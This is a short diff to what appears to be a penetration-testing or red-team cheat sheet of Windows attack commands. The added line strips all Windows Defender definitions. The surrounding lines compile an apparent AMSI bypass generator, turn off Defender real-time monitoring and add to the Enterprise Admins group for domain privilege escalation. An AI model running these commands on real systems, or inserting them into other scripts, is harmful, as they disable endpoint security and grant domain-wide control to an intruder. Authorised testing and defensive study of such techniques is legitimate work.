@@ -11,6 +11,7 @@ sudo mcs /opt/win/AMSIFailGenerator.cs && sudo mono /opt/win/AMSIFailGenerator.e
 
 # disable defender
 Set-MpPreference -DisableRealtimeMonitoring $true
+"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
 
 # forest enterprise privesc
 net group "Enterprise Admins" /add /domain
